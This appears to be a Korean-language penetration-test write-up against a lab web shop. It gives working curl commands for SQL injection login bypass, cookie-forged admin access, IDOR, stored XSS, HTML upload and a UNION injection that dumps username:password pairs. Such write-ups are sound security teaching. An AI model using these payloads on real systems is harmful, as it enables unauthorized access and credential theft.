# 2단계: 공격 과정

## 1. SQL 인젝션 발견

### 로그인 폼 테스트
```bash
curl -X POST \
  -d "username=admin' OR '1'='1' --&password=test" \
  "http://10.210.136.53:3000/login"
```

### 결과
```
Set-Cookie: user=admin; Path=/
Set-Cookie: isAdmin=false; Path=/
Set-Cookie: user_id=1; Path=/
```

**분석**: 인증 우회 성공! admin 계정으로 로그인됨

---

## 2. 쿠키 조작으로 권한 상승

### 쿠키 분석
- `user=admin` - 사용자명
- `isAdmin=false` - 관리자 여부 (클라이언트 측!)
- `user_id=1` - 사용자 ID

### 권한 상승
```bash
curl -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  "http://10.210.136.53:3000/admin/users"
```

### 결과
관리자 페이지 접근 성공!
- `/admin/products` - 상품 관리
- `/admin/users` - 사용자 관리

---

## 3. IDOR 취약점 확인

### 다른 사용자 주문 조회
```bash
curl -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  "http://10.210.136.53:3000/order?id=2"
```

### 결과
User ID 2의 주문 정보 노출:
- 주문 번호: #2
- 상품: Acid Wash Tee
- 금액: $45.00

---

## 4. 저장형 XSS 공격

### 게시판에 악성 스크립트 삽입
```bash
curl -X POST \
  -d "content=<script>alert('XSS')</script>" \
  "http://10.210.136.53:3000/board"
```

### 결과
스크립트가 이스케이프 없이 저장됨 (HTML 주석에 취약점 명시됨)

---

## 5. 파일 업로드 취약점

### HTML 파일 업로드
```bash
echo '<script>alert(1)</script>' > /tmp/test.html

curl -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  -F "profile_image=@/tmp/test.html" \
  "http://10.210.136.53:3000/profile/upload"
```

### 업로드 파일 접근
```bash
curl "http://10.210.136.53:3000/uploads/test.html"
# 출력: <script>alert(1)</script>
```

---

## 6. 데이터베이스 덤프

### UNION 기반 SQL 인젝션
```bash
curl -X POST \
  -d "username=' UNION SELECT group_concat(username||':'||password),2,3,4 FROM users--&password=test" \
  "http://10.210.136.53:3000/login"
```

### 추출 결과
- admin:admin123
- guest:guest123
- testuser:testpassword
- (총 60개 이상 계정)

---

## 7. 사용된 도구

| 도구 | 용도 |
|------|------|
| curl | HTTP 요청 |
| gobuster | 디렉토리 브루트포싱 |
| nikto | 취약점 스캔 |
| sqlmap | SQL 인젝션 자동화 (실패) |

## 8. 타임라인

| 시간 | 작업 |
|------|------|
| 00:00 | 연결 테스트 및 정찰 시작 |
| 00:05 | 디렉토리 브루트포싱 완료 |
| 00:10 | SQL 인젝션 발견 및 인증 우회 |
| 00:12 | 쿠키 조작으로 관리자 권한 획득 |
| 00:15 | IDOR, XSS, 파일 업로드 취약점 확인 |
| 00:20 | 데이터베이스 덤프 성공 |
| 00:25 | 추가 취약점 탐색 |
| 00:30 | 문서화 |
